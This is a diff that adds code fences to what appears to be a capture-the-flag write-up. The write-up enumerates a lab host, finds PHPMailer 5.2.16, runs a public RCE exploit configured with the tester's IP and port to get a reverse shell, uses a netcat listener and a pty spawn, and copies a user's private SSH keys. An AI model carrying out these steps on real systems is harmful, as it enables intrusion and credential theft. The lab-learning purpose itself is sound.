@@ -31,7 +31,7 @@ HOP RTT     ADDRESS
 So we see that there not much ports open, we then head to the web page to see whats up.
 
 We then run a nikto scan.
-
+```
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.254.105
@@ -52,7 +52,7 @@ We then run a nikto scan.
 + End Time:           2017-08-07 00:13:25 (GMT8) (17 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-
+```
 Seems that there isnt much happening, we thought we could see any misconfigurations.
 
 We need to enumerate more...
@@ -64,7 +64,7 @@ dirb http://192.168.254.103/mailer/examples/
 A dirb scan gave us an interesting view, which is a PHPMailer version which is 5.2.16
 
 We run searchsploit to see what we could make us.
-
+```
 PHPMailer 1.7 - 'Data()' Function Remote Denial of Service                                                                  | php/dos/25752.txt
 PHPMailer < 5.2.18 - Remote Code Execution (Bash)                                                                           | php/webapps/40968.php
 PHPMailer < 5.2.18 - Remote Code Execution (PHP)                                                                            | php/webapps/40970.php
@@ -74,7 +74,7 @@ PHPMailer < 5.2.20 - Remote Code Execution                                      
 PHPMailer < 5.2.20 / SwiftMailer < 5.4.5-DEV / Zend Framework / zend-mail < 2.4.11 - (AIO) 'PwnScriptum' Remote Code Execut | php/webapps/40986.py
 PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution                                                                    | php/webapps/42221.py
 WordPress PHPMailer 4.6 - Host Header Command Injection (Metasploit)   
-
+```
 We decide to use the Python version (40974.py).
 
 We edit the following parameters:
@@ -84,7 +84,7 @@ payload = 192.168.254.102 <- our local ip : 4444 <- the port we will listen to
 After that, we save the file then run our program.
 
 python 40974.py
-
+```
 _____________________________________________________________________________________
  █████╗ ███╗   ██╗ █████╗ ██████╗  ██████╗ ██████╗ ██████╗ ███████╗██████╗ 
 ██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗
@@ -98,19 +98,19 @@ ________________________________________________________________________________
 [+] SeNdiNG eVIl SHeLL To TaRGeT....
 [+] SPaWNiNG eVIL sHeLL..... bOOOOM :D
 _____________________________________________________________________________________
-
+```
 Success.
 We run: nc lvp -4444
 
 After waiting for a few moments we have a reverse shell.
-
+```
 $ whoami
 www-data
-
+```
 To spawn a proper shell we use Python's tty
-
+```
 python -c 'import pty; pty.spawn("/bin/sh")'
-
+```
 Now time to look around to see what may interest us.
 
 So after looking for flags we coudn't find one but when we go to /home/ there
@@ -156,11 +156,11 @@ So after taking a few steps back, mingling with other directories I could not fi
 Then I decided to see smith's directory to check any other crumbs left.
 
 We move to smith's .ssh files here's to some interest (finally)
-
+```
 -rwx------ 1 smith users  101 Mar 22 05:01 authorized_keys
 -rwx------ 1 smith users  411 Mar 22 04:48 id_ed25519
 -rwx------ 1 smith users  101 Mar 22 04:48 id_ed25519.pub
-
+```
 We then copy the ssh keys to our local machine, then ssh our way through.
 
 Welcome to
